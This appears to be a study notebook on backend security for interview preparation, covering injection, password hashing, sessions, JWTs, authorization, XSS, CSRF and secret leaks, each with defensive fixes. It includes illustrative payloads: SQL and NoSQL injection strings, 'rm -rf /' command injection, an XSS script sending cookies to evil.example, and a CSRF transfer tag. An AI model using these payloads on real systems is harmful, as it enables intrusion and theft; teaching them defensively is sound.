:::title Before you read on: list every place data from outside enters your backend. Keep it. Add to it as you go.
Study Notebook / 05
Backend Security
Where you made an assumption, and who is going to find it
Senior backend and full-stack interview preparation. Read with a pen.
:::

## How to use this book

This book follows *Backend Security: Everything You Need to Know*
(`youtube.com/watch?v=Hs0nWRxjnkI`, 2h50, the longest lecture in the *Backend
from First Principles* playlist), and it borrows the lecture's best decision:
it does not hand you a list of named vulnerabilities to memorise.

It teaches one question instead, and then shows the same question producing
every vulnerability in turn.

:::key
==Where did the developer make an assumption?== That is the only question an
attacker asks. Not which framework, not which language. Every section in this
book is that question pointed at a different part of your system.
:::

The goal is not to make you able to recite OWASP. It is to make you slightly
paranoid in a useful way, so that when you write a handler you notice the
moment you assumed the input was clean, the caller was who they claimed, or
nobody would open the network tab.

#### Scope

Security is enormous: network, transport, operating system, physical, social.
This book is scoped exactly where the lecture is, to ==the application you
write==: your handlers, your queries, your session logic, your headers.

#### The five block types

| Block | What it means |
|---|---|
| Interviewer asks | A real follow-up you should expect. Answer it out loud before reading on. |
| Senior signal | The specific sentence that separates a senior answer from a mid-level one. |
| Trap | A common answer that sounds right and is wrong. |
| Do this | The concrete practice, with the parameter or command. |
| Key idea | The one thing to carry out of that section. |

#### The marks

| Mark | Means |
|---|---|
| ==peach== | The sentence to carry away |
| !!rose!! | The wrong answer, the thing that bites |
| ++mint++ | The correct practice |
| %%pink%% | A definition, at the point it is first defined |
| __underline__ | The phrase the sentence turns on |
| ((circle)) | The thing you will be asked about |

:::toc
:::

## The whole book in one question

Every vulnerability here is the same shape. Something crosses a boundary, and
on the far side it is treated as more than it was.

```text
  USER INPUT ──▶ your code ──▶ another system that PARSES it
                                       │
                                       ├─ SQL          ──▶ SQL injection
                                       ├─ a shell      ──▶ command injection
                                       ├─ HTML in a    ──▶ XSS
                                       │  browser
                                       ├─ your auth    ──▶ broken authz
                                       │  check
                                       └─ a log, an    ──▶ leaks
                                          error page
```

Three questions to ask of any handler you write, and they are the whole method:

1. ==Where is data crossing a boundary?==
2. ==What am I assuming about it?==
3. ==What happens if that assumption is wrong?==

:::redraw Your own application. Draw every arrow where data from outside enters, and mark what parses it on the far side. | Browser, database, shell, filesystem, third-party API, logs.
:::

:::part I | The attacker's question

Not a list of attacks. One question, and the observation about your own system
that makes the question productive.
:::

## 1. Assumptions are the vulnerability

An attacker does not care what framework you used. They care about exactly one
thing: which sentence in your head was "that will never happen".

```text
  "the input will be clean"              ──▶ injection
  "they are who they say they are"       ──▶ broken authentication
  "they only see their own ids"          ──▶ broken authorization
  "nobody will open the network tab"     ──▶ all of the above
  "nobody will guess this URL"           ──▶ IDOR
  "the frontend already validated it"    ──▶ everything
```

Every one of those is reasonable under a deadline, and every one is a
==happy-path assumption==: the user fills the form correctly, clicks the right
buttons, navigates the way you designed. Attackers do not use your app. They
==probe== it: every input, every parameter, every header, every id.

:::signal
"I try to write handlers as if the client is hostile rather than merely
mistaken. ==Validation on the frontend is a user-experience feature; it is not
a control.== Anything the client can send, it will eventually send."
:::

:::trap "We are a small product, nobody is targeting us"
Almost nothing is targeted. Automated scanners walk the entire internet trying
known parameter shapes against every host that answers, and they do not check
your revenue first. ==Being small changes who finds you, not whether you are
found.==
:::

## 2. Your application speaks several languages

This is the observation the whole of Part II rests on, and it is worth drawing.

:::figure languages
One process, four grammars. Each of those arrows is a place where a string you
composed gets parsed by something else.
:::

Your backend is one process, but it emits text into several very different
interpreters, and ==each of them has its own grammar, its own special
characters, and its own idea of where a command ends==.

| Context | Language | Characters that mean "something else" |
|---|---|---|
| Database | SQL | `'` `"` `;` `--` `/* */` |
| Browser | HTML, JS, CSS | `<` `>` `&` `"` `'` |
| Operating system | Shell | `;` `&&` `\|` backtick `$()` `>` |
| Filesystem | Paths | `..` `/` `\0` |
| Templates, logs, CSV | Whatever parses them | `{{ }}` newlines, `=` `+` `@` |

A user types in one of those languages, usually because they are in a browser.
The vulnerability appears when their text ==crosses into another one==.

:::key
%%Injection%% is not a database problem. It is what happens whenever ==text
supplied as data ends up being parsed as instructions== by anything downstream.
Once you see it that way, SQL injection, command injection, XSS and template
injection are one bug with four addresses.
:::

## 3. The boundary between data and code

:::figure boundary
The same characters. On the left they are a string a user typed. On the right
they are syntax the database obeyed.
:::

```sql
-- what the developer wrote
"SELECT * FROM users WHERE email = '" + input + "'"

-- what the user typed
' OR '1'='1' --

-- what the database received and executed
SELECT * FROM users WHERE email = '' OR '1'='1' --'
```

Read the last line as the database reads it. The quote closes the string early,
`OR '1'='1'` is a condition that is always true, and `--` comments out
everything that followed. The `WHERE` clause now matches ==every row in the
table==.

Nothing malformed happened. The database did exactly its job. ==The developer
handed it a sentence and it parsed the sentence.==

:::signal
"The bug is not the quote character. The bug is that ==the query was assembled
as a string==, so there was no moment at which the database could tell which
parts came from me and which came from a stranger. Every fix in this part is
the same fix: keep the two apart."
:::

:::part II | Injection

One flaw, four addresses. The fix is structurally identical every time, and it
is never "escape the input".
:::

## 4. SQL injection

The canonical case, and still one of the most damaging, because the database
usually holds everything.

```text
  login form                         what it becomes

  email:  ' OR '1'='1' --            WHERE email = '' OR '1'='1' --'
  password: anything                 ──▶ returns the first user in the table
                                     ──▶ your code compares nothing, or
                                         logs them in as whoever that is
```

The same technique escalates well past reading rows:

| The attacker appends | Gets |
|---|---|
| `UNION SELECT ... ` | Data from ==other tables==, including password hashes |
| `; UPDATE users SET role='admin' ...` | Privilege escalation, if the driver allows stacked statements |
| `; DROP TABLE ...` | Destruction |
| A slow condition, and times the response | ==Blind extraction==, one bit at a time, with no output at all |

That last row matters because it removes the usual comfort. An endpoint that
returns nothing useful, only "invalid login", still leaks the whole database if
the attacker can measure ==how long it took to say no==.

:::trap "We escape quotes, so we are safe"
Escaping is a blacklist, and blacklists lose. Different encodings, different
character sets, numeric contexts where no quotes are needed at all
(`WHERE id = 1 OR 1=1`), second-order injection where the value is stored
cleanly and concatenated later by different code. ==You cannot enumerate every
dangerous string. You can stop parsing user data as syntax.==
:::

## 5. Parameterised queries, and what they cannot do

:::figure parameterised
Two channels. The database parses the template once, before your value has
been sent, so there is no parse step left for the value to influence.
:::

```js
// ✗ one channel: the value becomes part of the sentence
db.query("SELECT * FROM users WHERE email = '" + email + "'");

// ✓ two channels: the sentence is fixed, the value is only ever a value
db.query("SELECT * FROM users WHERE email = $1", [email]);
```

The mechanism is worth stating precisely, because "it escapes the string" is
only half of it. The statement and the data ==travel separately==. By the time
your value arrives, the query's structure is already parsed and fixed. There is
nothing left for a quote to close.

:::do What parameters cannot do
Parameters bind ==values==, never ==identifiers==. You cannot parameterise a
table name, a column name, or a sort direction:

```text
  ✗ ORDER BY $1      -- sorts by a constant, silently
  ✓ ORDER BY <a column name looked up in a map you wrote>
```
So dynamic sorting and filtering must come from a ++whitelist++. That gap is
exactly where injection reappears in hand-rolled query builders. Notebook 04
section 28 has the pattern in full.
:::

:::ask Does an ORM make me safe?
Mostly, for the queries it generates, and ==not at all for the escape hatches==.
Every ORM has `raw()`, `query()`, `literal()` or a `WHERE` fragment that takes a
string, and that is where the injection will be. Prisma's `$queryRawUnsafe`,
Sequelize's `literal`, Django's `extra`, ActiveRecord's string conditions: the
names all warn you, and people use them under deadline anyway. Grep your
codebase for them; that grep is a five-minute audit with a high hit rate.
:::

## 6. NoSQL injection

"I use MongoDB, so I do not write SQL, so I am safe." The language changed. The
flaw did not.

```js
// the handler expects strings
db.users.findOne({ email: req.body.email, password: req.body.password });

// so the attacker sends objects
{ "email": "alice@example.com", "password": { "$ne": null } }

//  ──▶ { email: "alice@…", password: { $ne: null } }
//  ──▶ "any password that is not null"   ──▶ logged in as Alice
```

The injected content is not a quote, it is ==a data structure==. `$ne`, `$gt`,
`$regex` and `$where` are operators, and a JSON body can carry them wherever
your code expected a scalar.

:::do The fix is the same shape: never let the type change
- ++Validate the type before the query++, not just the presence. A schema
  validator that says `email: string` rejects an object outright.
- ++Cast explicitly++: `String(req.body.email)`.
- ++Disable operator injection at the driver++ where it is offered, and never
  use `$where`, which evaluates JavaScript server-side.
:::

## 7. Command injection

Same flaw, pointed at the operating system, and usually the most destructive of
the three because the shell can do anything the process can.

The setup is ordinary. Users upload an image, your backend resizes it by
shelling out:

```js
// ✗ the output filename comes from the user
exec(`ffmpeg -i input.jpg -vf scale=220:120 ${outputName}`);
```

```text
  outputName = "thumb.jpg"
      ──▶ ffmpeg -i input.jpg -vf scale=220:120 thumb.jpg      fine

  outputName = "thumb.jpg; rm -rf /"
      ──▶ ffmpeg -i input.jpg -vf scale=220:120 thumb.jpg; rm -rf /
                                                          ^
                            the shell reads ";" as "and now run this"
```

The shell metacharacters that end a command and start another are
`;` `&&` `||` `|` `` ` `` `$( )` and a newline. Any one of them turns your
argument into a second command.

## 8. The argument array

The fix is not escaping. It is ==not invoking a shell at all==.

```js
// ✗ builds one string, hands it to /bin/sh to parse
exec(`ffmpeg -i ${input} -o ${output}`);

// ✓ hands the kernel a program and a list of arguments
execFile("ffmpeg", ["-i", input, "-o", output]);
```

```text
  WITH A SHELL              your string ──▶ /bin/sh ──▶ parses ──▶ execve
                                              ▲
                                     the attacker's semicolon
                                     is meaningful HERE

  WITH AN ARGUMENT ARRAY    ["ffmpeg", "-i", "a.jpg", "-o", "x; rm -rf /"]
                                              ──▶ execve, directly
                            "x; rm -rf /" is one filename. weird, but one.
                            nothing parses it. there is no shell.
```

Every language has both forms, and the safe one is always the one that takes a
list:

| Language | Avoid | Use |
|---|---|---|
| Node | `exec`, `execSync` with a template string | `execFile`, `spawn` with an array |
| Python | `os.system`, `subprocess.run(..., shell=True)` | `subprocess.run([...])` |
| Go | `exec.Command("sh", "-c", s)` | `exec.Command("ffmpeg", args...)` |
| Java | `Runtime.exec(String)` | `ProcessBuilder(List<String>)` |

:::do And still validate, because the array is not the whole job
An argument array stops command ==chaining==. It does not stop an argument
being hostile in its own right: a filename beginning with `-` can be read as a
flag, and `../../etc/passwd` is a perfectly valid single path.
- ++Generate filenames server-side++, never from user input. Notebook 02
  section 15 makes the same argument for object keys.
- ++Prefix user paths with `./`++ or pass `--` before positional arguments so
  a leading dash cannot become an option.
- ++Prefer a library over a subprocess++ where one exists. `sharp` beats
  shelling out to ImageMagick, and removes the whole category.
:::

:::recall Three injection contexts, the character that breaks each, and the one structural fix they share. | 6
:::

:::part III | Authentication

Proving who someone is. Four places it goes wrong: how you store the secret,
how you carry the session, what you put in a token, and how many times you let
someone guess.
:::

## 9. Build it only if you have a reason

The lecture opens this section with advice worth repeating, because it is
unusual to hear it from someone about to explain the mechanism in detail:

:::signal
"For most products I would ==buy authentication==. Clerk, Auth0, Supabase Auth,
Cognito. Not because the mechanism is hard to understand, but because the
surface is enormous: password reset, email verification, MFA, device
management, session revocation, OAuth callbacks, enumeration timing, rate
limits. ==Every one of those is a place to be wrong, and none of them are my
product.== I still need to understand all of it, because I have to review it."
:::

That is the honest position, and it is a good interview answer precisely
because it is a judgement rather than a reflex. Build it yourself when you have
a specific reason: an unusual identity model, a hard data-residency
constraint, an air-gapped deployment, or cost at a scale where it dominates.

Everything that follows is what you need to know either way.

## 10. Never store a password

```text
  the breach happens. it always eventually happens.
  the only question is what the attacker walks away with.

  plaintext            every account, everywhere       ✗✗✗
                       (people reuse passwords, so you
                        just breached their bank too)

  encrypted            the key is on the same server   ✗✗

  hashed, unsalted     see section 11                  ✗

  hashed + salted      a very long, very expensive     ✓
  with argon2/bcrypt   offline attack per password
```

Encryption is the wrong tool and knowing why is a good signal: encryption is
==reversible by design==, so the key must exist somewhere near the data, and an
attacker with your database usually has your config too. ==You never need to
read a password back.== You only need to check one.

A %%hash function%% is one-way and deterministic: same input, same fixed-length
output, no way back. So you store `hash(password)`, and at login you hash what
they typed and compare.

:::trap "We do not store passwords in plaintext, we mask them in the logs"
Different problem. Masking in logs is necessary and does nothing for the
database. Also check what your ==error reporting== sends: a request body
captured into Sentry on a 500 will happily include the login payload unless you
scrub it.
:::

## 11. Why hashing alone is not enough

:::figure rainbow
The property that makes a hash useful for checking passwords, determinism, is
the same property that makes it precomputable.
:::

If `sha256("password123")` is always `ef92b7...`, then an attacker does not
have to attack ==your== hash. They compute the hashes of every common password
once, store the mapping, and then a stolen database is a ==lookup, not a
guess==. That table is a %%rainbow table%%, and they are freely available for
every common algorithm.

Two multipliers make it worse:

```text
  UNSALTED, so identical passwords produce identical hashes:

    alice   ef92b7…        ──▶ crack one, crack all three
    bob     ef92b7…            and you learn who shares a password
    carol   ef92b7…            without cracking anything at all

  FAST, because SHA-256 and MD5 are DESIGNED to be fast:

    a GPU rig does billions of hashes per second.
    every password up to 8 characters, exhaustively, is hours.
```

Speed is the subtle one. General-purpose hashes are optimised for throughput,
which is exactly wrong here: ==you want the function to be slow==, because you
compute it once per login and the attacker computes it billions of times.

## 12. Salt, and the right algorithm

```text
  salt = 16+ random bytes, UNIQUE PER USER, stored next to the hash
         (it is not a secret. it does not need to be.)

  stored:  argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>
                                          ▲      ▲
                                          │      └ hash(password + salt)
                                          └ different for every single user
```

The salt does one job and does it completely: ==identical passwords now produce
different hashes==, so a precomputed table is worthless and every password must
be attacked individually.

| Algorithm | Verdict |
|---|---|
| MD5, SHA-1, SHA-256 | !!Never for passwords.!! Fast is the wrong property |
| PBKDF2 | Acceptable, widely certified, weakest of the three below |
| bcrypt | ==Fine.== Long-established. Note the 72-byte input limit |
| scrypt | Good. Memory-hard |
| ==argon2id== | The current default recommendation. Memory-hard and side-channel resistant |

:::do What to actually do
- ++Use the library's defaults++ for argon2id or bcrypt and do not invent
  parameters. Raise the work factor over time as hardware improves.
- ++Let the library generate the salt++ and store it in the encoded hash
  string. Never write your own salt handling.
- ++Never write your own comparison.++ Use `verify()`, which is
  constant-time; `==` on hash strings leaks timing.
- ++Set a maximum password length++ (say 1,024 characters) so nobody can make
  you argon2 a 10 MB body. Denial of service by hashing is real.
- ++Do not impose composition rules++ ("one symbol, one capital"). Length and
  a breached-password check (Have I Been Pwned's k-anonymity API) beat
  character classes, which mostly produce `Password1!`.
:::

:::ask What is peppering, and do you need it?
A %%pepper%% is a secret value mixed into the hash that lives in your
application config or an HSM rather than the database. It means a stolen
==database alone== is not enough to attack the hashes offline. It is genuinely
useful, and the cost is that rotating it requires rehashing on next login and
that losing it locks everyone out. Reasonable to describe as "a defence-in-depth
option I would consider, not a substitute for a slow salted hash".
:::

## 13. Sessions

Once the password is verified, the user should not send it again. They carry a
%%session identifier%% instead.

```text
  LOGIN                                  SERVER
  email + password  ─────────────▶  verify hash
                                    generate 128+ bits of CSPRNG randomness
                                    store: session_id ──▶ { user_id, expires,
                                                            ip, user_agent }
                    ◀─────────────  Set-Cookie: sid=…

  EVERY REQUEST AFTER
  Cookie: sid=…     ─────────────▶  look up sid ──▶ user_id
                                    the id is a bearer token: whoever
                                    holds it IS the user, until it expires
```

| Property | Requirement |
|---|---|
| Randomness | ==A CSPRNG==, never `Math.random()`, never a counter, never a UUIDv1 |
| Length | 128 bits of entropy minimum |
| Content | ==Meaningless.== The id maps to server state; it does not encode it |
| Rotation | ==Regenerate on login and on privilege change==, or you have session fixation |
| Expiry | Absolute and idle timeouts, both enforced ==server-side== |
| Logout | Deletes the server-side record, not just the cookie |

That rotation row is the one people miss. If an attacker can set a victim's
session id before they log in (via a link, a subdomain, an XSS), and you keep
the same id afterwards, the attacker's known id is now an authenticated
session. Issuing a fresh id at login closes it.

## 14. Cookie flags

```text
  Set-Cookie: sid=…; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=1209600
                     ▲         ▲       ▲
                     │         │       └ not sent on most cross-site requests
                     │         └ HTTPS only, so it is never sent in the clear
                     └ JavaScript cannot read it, so XSS cannot steal it
```

| Flag | Stops |
|---|---|
| `HttpOnly` | An XSS payload reading `document.cookie`. Section 23 |
| `Secure` | The cookie travelling over plain HTTP and being read at any hop |
| `SameSite=Lax` | Most CSRF. Section 25 |
| `SameSite=Strict` | More CSRF, at the cost of breaking inbound links |
| `Path` / `Domain` | Sending the cookie further than it needs to go |

:::signal
"==Storing a session token in `localStorage` is a decision to lose it to any
XSS you ever ship==, because JavaScript can read it by definition. An
`HttpOnly` cookie cannot be read by script at all. People choose localStorage
to avoid CSRF, which trades a defence you get from one header for a
vulnerability you cannot mitigate."
:::

:::ask What is the argument for binding a session to the IP or user agent?
It raises the cost of using a stolen cookie, and it costs you real users:
mobile clients change IP constantly, corporate networks share them, and user
agents change on browser update. The usual compromise is ==not to reject, but
to record==: store the IP and user agent, and use a change as a signal to
re-authenticate for sensitive actions or to notify the user, rather than to
kill the session outright.
:::

## 15. JWT: what you gain and what you give up

```text
  STATEFUL SESSION                    STATELESS JWT

  cookie: sid=a3f9…                   cookie: eyJhbGciOi…
             │                                   │
             ▼                                   ▼
  server looks it up                  server VERIFIES THE SIGNATURE
  in Redis or Postgres                and reads the claims inside
             │                                   │
  one round trip, and full           no round trip, and no way to
    control: delete the row              revoke: the token is valid
    and the session is gone            until it expires
```

A JWT is three base64 segments: header, payload, signature. Two facts follow
immediately, and both are asked about:

- ==The payload is encoded, not encrypted.== Anyone holding the token can read
  every claim in it. Never put anything secret in a JWT.
- ==The signature proves integrity, not secrecy.== Change one byte of the
  payload and verification fails, which is exactly what you want, and it tells
  you nothing about who is holding the token.

| | Stateful session | Stateless JWT |
|---|---|---|
| Revocation | ==Immediate.== Delete the row | ==Not possible== before expiry |
| "Log out all devices" | Trivial | Needs a version claim or a blocklist |
| Storage | A row or a Redis key per session | None |
| Verification cost | One lookup | One signature check |
| Scaling | Shared store required | Any node can verify alone |
| Size on the wire | ~40 bytes | Hundreds of bytes, every request |

:::trap "JWTs are more secure because they are signed"
Signing gets you ==integrity==, which a random opaque session id also has, by
virtue of being unguessable and meaningless. What JWTs buy is ==statelessness==,
and what they cost is ==revocation==. That is the trade. If you find yourself
building a blocklist of revoked JWTs, checked on every request, you have
rebuilt a session store with worse ergonomics.
:::

:::do If you use JWTs, do these
- ++Pin the algorithm server-side.++ Never trust the `alg` header. Reject
  `none`, and reject an HMAC token if you expect RS256. This is a real,
  historic, catastrophic bug class.
- ++Verify `exp`, `iss` and `aud`++, not just the signature.
- ++Keep access tokens short-lived++, five to fifteen minutes, and pair them
  with a refresh token that is stored server-side and therefore revocable.
- ++Rotate refresh tokens on use++ and detect reuse: a refresh token presented
  twice means one copy was stolen, so kill the whole family.
:::

## 16. Rate limiting

Two different attacks, one mechanism.

```text
  CREDENTIAL ATTACK          slow, targeted, looks like normal traffic
                             a few attempts per account, thousands of
                             accounts, from thousands of addresses

  VOLUMETRIC                 fast, loud, indiscriminate
                             the point is that you fall over
```

:::trap "We rate limit by IP, so brute force is handled"
IP is nearly free for an attacker. Residential proxy pools rent millions of
addresses; a botnet has them already; mobile carriers NAT thousands of real
users behind one address, so a strict IP limit blocks a whole city while the
attacker rotates. ==IP is a useful signal and a terrible identity.==
:::

:::do Limit on several keys at once
- ++Per account++: five failed logins for `alice@example.com` is suspicious no
  matter where they came from. This is the one that stops credential stuffing.
- ++Per IP++ and ++per subnet++, as a coarse backstop.
- ++Global, per endpoint++, so `/login` cannot consume the whole service.
- ++Escalate rather than block++: delay, then CAPTCHA, then require a second
  factor, then lock with an email. A hard lock on failed attempts is itself a
  denial-of-service against the real user.
- ++Constant-time responses++ so failures do not leak whether the account
  exists, and identical wording for "wrong password" and "no such user".
:::

:::recall Password stored, session issued, cookie set: name every property and flag, and what each one prevents. | 8
:::

:::part IV | Authorization

Authentication asks who you are. Authorization asks what you may touch, and it
is where the expensive bugs live, because the request is completely valid.
:::

## 17. The layer where the check belongs

Here is the shape of almost every real authorization bug. Nothing is missing.
Every layer does a check. The check is at the wrong altitude.

:::figure authz-layers
The route checked the session. The controller checked the role. Nobody checked
whether this row belongs to this caller.
:::

```js
// route:       requireAuth              ✓ they are logged in
// controller:  requireRole('accountant') ✓ accountants may read invoices
// service:     business rules            ✓
// repository:
db.query("SELECT * FROM invoices WHERE id = $1", [req.params.id]);
//                                  ✗ WHOSE invoice?
```

Every guard passed. The caller is authenticated, and their role does permit
reading invoices. It just does not permit reading ==this== invoice, and nothing
in the stack ever asked.

:::key
Role answers =="may this kind of user do this kind of thing"==. It cannot
answer =="may this specific user touch this specific row"==, because the row is
not known until the repository. ==The ownership check belongs at the last point
of access==, in the query itself.
:::

```sql
-- ✗ authorised at the door, unfiltered at the shelf
SELECT * FROM invoices WHERE id = $1;

-- ✓ the scope is part of the query, so there is no unscoped path
SELECT * FROM invoices WHERE id = $1 AND tenant_id = $2;
```

:::signal
"I push the scope into the query rather than checking after fetching, because
==a check you have to remember is a check you will eventually forget==. If
`findInvoice` cannot be called without a tenant, the unsafe version is not
merely discouraged, it is unwriteable. Some teams enforce this with row-level
security in Postgres so it holds even for a script."
:::

## 18. Broken object level authorization

The lecture's name for it is BOLA; you will also hear ==IDOR==, insecure direct
object reference. It is consistently the most commonly exploited API flaw, and
it requires no tooling at all.

:::figure idor
No exploit. No payload. The attacker changed a number in the URL.
:::

```text
  GET /api/invoices/101     ✓ mine
  GET /api/invoices/102     ← and now?
  GET /api/invoices/103
  ...
  a loop from 1 to 100000 downloads every invoice in the system.
```

There is nothing to detect in the request. It is well-formed, authenticated,
and matches your API contract exactly. ==The only thing wrong with it is that
you answered.==

:::trap "We use UUIDs, so they cannot be guessed"
That is obscurity, not authorization, and it fails in ordinary ways: ids leak
through shared links, referrer headers, screenshots, support tickets, exports,
a partner's logs, and any other endpoint that returns a list. ==Random ids are
worth having and they are not a control.== The control is the ownership check.
:::

:::do Make the unsafe call impossible to write
- ++Scope every fetch by the caller++, always: `WHERE id = $1 AND tenant_id = $2`.
- ++Put the tenant in the repository signature++ so it cannot be omitted.
- ++Consider row-level security++ in Postgres, with the tenant set per
  connection, so the database enforces it below all your code.
- ++Test for it++: every list and detail endpoint gets a test where user B asks
  for user A's id and must be refused. This is a test you can generate.
:::

## 19. What the status code leaks

You correctly refuse. Which refusal do you send?

```text
  403 Forbidden   "this invoice exists, and it is not yours"
                        ▲
                        └── you just confirmed it exists.
                            loop the ids, keep the 403s, and you have
                            mapped every invoice in the system, plus a
                            rough count of your customers' activity.

  404 Not Found   "there is no such invoice, as far as you are concerned"
                        ▲
                        └── indistinguishable from a real miss
```

:::do Return 404 for objects the caller may not see
==Use 403 when the caller may know the resource exists== but lacks permission
for the action, for example an authenticated member trying an admin route in a
tenant they belong to. ==Use 404 when the existence of the object is itself
information==, which is almost every per-row case. And keep the timing similar,
because a 404 that comes back in 3ms when a real miss takes 30ms leaks the same
fact.
:::

The same reasoning applies at the front door: "no account with that email" and
"wrong password" must be one message, or your login form is an account
enumeration endpoint.

## 20. Deny by default

```text
  ALLOWLIST                          BLOCKLIST
  everything is forbidden            everything is permitted
  until a rule permits it            until a rule forbids it

  a new endpoint ships:              a new endpoint ships:
    ──▶ nobody can reach it            ──▶ everybody can reach it
    ──▶ someone files a bug            ──▶ nobody notices for a year
    ──▶ you add the rule
```

This is the single highest-leverage structural decision in the whole book,
because it changes what happens on the day someone forgets. With deny-by-default
the failure mode of forgetting is ==an outage you hear about in minutes==. With
allow-by-default it is ==a breach you hear about from a stranger==.

:::do Make it structural, not cultural
- ++Apply the auth middleware globally++ and opt specific routes out, rather
  than opting routes in.
- ++Fail closed++: if the permission service errors, deny. An exception in a
  policy check must never fall through to "allowed".
- ++Add a test that enumerates your routes++ and asserts every one is covered
  by an authorization rule. New route with no rule fails CI.
:::

## 21. Audit logging

Authorization tells you what was allowed. An audit log tells you what actually
happened, and it is the difference between "we were breached" and "we know
exactly which 340 records were read, when, and by whom".

```text
  actor_id   what authenticated identity
  action     invoice.read, user.role_changed, export.created
  target     invoice:102
  when       timestamptz
  from       ip, user agent
  result     allowed | denied
```

:::do Log the denials too, and keep the log out of reach
==Denied attempts are the signal.== One 403 is a mistake; four hundred in a
minute across sequential ids is an attack in progress, and it is only visible
if you recorded the refusals. Write the audit log ==append-only==, to a store
the application cannot delete from, because the first thing an intruder edits
is the record of the intrusion.
:::

:::recall Where does the ownership check belong, why there, and what status code do you return? | 6
:::

:::part V | The browser is a boundary too

Three attacks that never touch your server's parser. They abuse the fact that
the browser trusts your origin, and that it will attach the user's credentials
to a request it did not intend to make.
:::

## 22. Cross-site scripting

:::figure xss
The attacker's script executes with your origin's privileges, in your victim's
browser, as your victim.
:::

The mechanism is section 3's again, with the browser as the parser:

```html
<!-- a comment field, rendered into the page -->
<div class="comment">Nice article!</div>

<!-- what somebody submitted instead -->
<div class="comment"><script>
  fetch('https://evil.example/?c=' + document.cookie)
</script></div>
```

Because it is served from ==your== domain, that script inherits everything your
origin has:

| It can | Because |
|---|---|
| Read cookies without `HttpOnly` | It is same-origin |
| Read `localStorage`, always | ==There is no flag that stops this== |
| Make authenticated requests as the victim | The browser attaches credentials |
| Rewrite the page | Fake login forms, changed payment details |
| Keylog | It is JavaScript on the page |

| Kind | Where the payload lives |
|---|---|
| ==Stored== | In your database. Served to every viewer. Worst |
| ==Reflected== | In a URL parameter echoed into the response. Needs a click |
| ==DOM-based== | Never reaches your server. `innerHTML` from `location.hash` |

:::do Escape on output, by context
The critical word is ==output==, not input. The same string is safe in one place
and dangerous in another, so escaping at the point of entry cannot be correct
for every destination.
- ++Let your template engine escape by default++ and treat every
  `dangerouslySetInnerHTML`, `v-html`, `\|safe` and `innerHTML` as a code review
  trigger.
- ++Sanitise HTML with a real library++ (DOMPurify) when you must accept rich
  text. Never with a regex.
- ++Escape for the context++: HTML body, attribute, JavaScript string, URL and
  CSS all have different rules.
- ++Set `HttpOnly`++ so at least the session cookie is out of reach.
:::

## 23. Content Security Policy

The defence that works even when you have already made the mistake.

```text
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-r4nd0m';
    object-src 'none';
    base-uri 'self';
    frame-ancestors 'none'

  the browser now refuses to execute:
    ✗ inline <script> without the matching nonce
    ✗ script from any other origin
  even though the injected tag is right there in your HTML.
```

:::signal
"CSP is the reason I treat XSS as ==defence in depth rather than a single
gate==. Escaping is the primary control and it is code I have to get right
every time; CSP is a policy that holds when I got it wrong once. I would deploy
it in `Content-Security-Policy-Report-Only` first, collect violations for a
fortnight, then enforce."
:::

## 24. Cross-site request forgery

:::figure csrf
The request is forged. The session is genuine. The browser attached it for you.
:::

```html
<!-- on evil.example, which you visit while logged into your bank -->
<img src="https://bank.example/transfer?to=attacker&amount=5000">
```

The browser sees an image tag, issues the GET, and ==attaches your bank cookies
because they belong to that domain==. Your bank sees a fully authenticated
request from a real session. No XSS is needed anywhere.

:::do Three layers, and one of them is free
- ++`SameSite=Lax`++ on session cookies, which is the modern browser default
  and stops the great majority of this. `Strict` is stronger and breaks
  inbound links.
- ++A CSRF token++ for cookie-authenticated state-changing requests:
  unpredictable, per-session, submitted in a header or body, and verified
  server-side. An attacker's page cannot read it, because that would be a
  cross-origin read.
- ++Never change state on GET.++ `GET /transfer?...` is the bug that makes an
  `<img>` tag sufficient. Safe methods must be safe.
:::

:::trap "CORS protects us from CSRF"
==CORS is not a security mechanism for your server.== It is a browser policy
about who may ==read a response==. The request in the example above is still
sent, and your server still executes it; the browser merely refuses to show the
attacker the reply, which they did not need. A permissive CORS policy is a real
problem for a different reason, and a restrictive one is not a CSRF defence.
:::

:::ask What is actually dangerous in a CORS config?
`Access-Control-Allow-Origin: *` combined with credentials (browsers refuse
this pairing, which is the point), and worse, ==reflecting the `Origin` header
back== with `Allow-Credentials: true`. That reflection makes every origin a
trusted origin, so any site can read authenticated responses from your API.
Allowlist explicit origins, never reflect, and never trust a `null` origin.
:::

## 25. Clickjacking

```text
  the attacker's page:

  ┌──────────────────────────────┐
  │  "You have won! Click here"  │  ← what the victim sees
  │        ┌──────────┐          │
  │        │  CLAIM   │          │
  │        └──────────┘          │
  └──────────────────────────────┘
             ▲
             │ invisible iframe of yourapp.example, opacity 0,
             │ positioned so "Delete account" sits under the cursor
             ▼
  the victim clicks your button, on your site, with their session.
```

:::do Two headers, and set both
++`Content-Security-Policy: frame-ancestors 'none'`++ is the modern control.
++`X-Frame-Options: DENY`++ is the legacy one, still worth sending for older
clients. Use `frame-ancestors 'self' https://partner.example` if you genuinely
need to be embedded.
:::

:::part VI | The things that leak

No attacker skill required. You published it.
:::

## 26. Secrets

```text
  git commit -m "add config"     .env, with DATABASE_URL, STRIPE_SECRET_KEY,
                                 AWS credentials, the JWT signing secret
        │
        ▼
  push to a public repo
        │
        ▼  automated scanners find it in seconds, not days
  your database, your payment account, your cloud bill
```

And the part people get wrong when they notice: ==deleting the file in a later
commit does nothing.== Git keeps history. The secret is still in the object
store, still in every clone, still in every fork, and still on GitHub's servers
after the branch is gone.

:::do The order of operations when a secret leaks
1. ++Rotate the credential first.++ Immediately. Before any cleanup, before
   telling anyone, before working out how it happened. ==Assume it is already
   in use.==
2. Then check the logs for what was done with it.
3. Then purge the history if you must, knowing forks and clones remain.
4. Then fix the cause: `.gitignore`, a pre-commit secret scanner (gitleaks,
   trufflehog), push protection on the remote, and secrets in a manager
   (Vault, AWS Secrets Manager, SOPS) rather than in files.
:::

:::trap "It is a private repo"
Private today. Contractors, acquisitions, a misclick on visibility, a laptop,
a compromised developer account, and a CI log that prints the environment.
==Private is an access control, not an encryption==, and secrets in a private
repo are still secrets on hundreds of disks.
:::

## 27. Error messages and debug output

The same handler, two audiences.

```text
  ✗ WHAT THE ATTACKER RECEIVES
    PostgresError: relation "users" does not exist
      at Connection.parseE (/app/node_modules/pg/lib/connection.js:614)
      query: SELECT * FROM users WHERE email = 'x' AND tenant = 4471
      DATABASE_URL=postgres://app:hunter2@10.0.1.14:5432/prod

    framework, version, file paths, schema, live data, credentials

  ✓ WHAT THE ATTACKER RECEIVES
